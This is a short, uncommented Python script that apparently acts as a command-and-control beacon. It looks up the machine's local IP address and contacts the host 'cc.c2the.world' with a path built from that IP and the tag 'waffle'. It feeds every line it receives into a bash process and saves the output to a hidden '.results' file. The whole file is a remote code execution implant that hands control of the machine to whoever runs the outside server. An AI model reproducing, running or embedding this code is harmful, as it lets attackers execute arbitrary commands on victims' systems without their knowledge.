import socket
import urllib as u
import sys
from subprocess import *
h = "http://cc.c2the.world"
a = "waffle"
try:
    ip = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
    ip = ip+"/"
except:
    ip = "U/"
code = u.urlopen(h+"/"+ip+a).readlines()
out = open(".results","w")
p = Popen("bash", stdin=PIPE, stdout=out, stderr=out)
for line in code:
    p.stdin.write(line)
p.communicate()
out.close()
